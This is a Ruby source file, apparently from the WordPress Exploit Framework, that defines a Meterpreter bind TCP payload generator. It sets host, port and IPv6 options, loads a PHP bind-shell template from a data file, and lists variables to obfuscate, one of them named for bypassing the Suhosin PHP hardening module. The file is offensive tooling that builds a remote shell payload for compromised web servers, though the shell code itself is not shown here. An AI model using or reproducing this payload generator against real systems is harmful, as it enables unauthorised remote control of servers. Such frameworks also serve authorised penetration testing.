# frozen_string_literal: true

module Wpxf::Payloads
  # A Meterpreter bind TCP payload generator.
  class MeterpreterBindTcp < Wpxf::Payload
    include Wpxf
    include Wpxf::Options

    def initialize
      super

      register_options([
        StringOption.new(
          name: 'rhost',
          required: true,
          desc: 'The address of the host listening for a connection'
        ),
        PortOption.new(
          name: 'lport',
          required: true,
          default: 4444,
          desc: 'The port being used to listen for incoming connections'
        ),
        BooleanOption.new(
          name: 'use_ipv6',
          required: true,
          default: false,
          desc: 'Bind to an IPv6 address'
        )
      ])
    end

    def host
      escape_single_quotes(datastore['rhost'])
    end

    def lport
      normalized_option_value('lport')
    end

    def use_ipv6
      normalized_option_value('use_ipv6')
    end

    def raw
      if use_ipv6
        DataFile.new('php', 'meterpreter_bind_tcp_ipv6.php').php_content
      else
        DataFile.new('php', 'meterpreter_bind_tcp.php').php_content
      end
    end

    def constants
      {
        'ip'   => host,
        'port' => lport
      }
    end

    def obfuscated_variables
      super + %w[ip port srvsock s_type s res b a len suhosin_bypass]
    end
  end
end
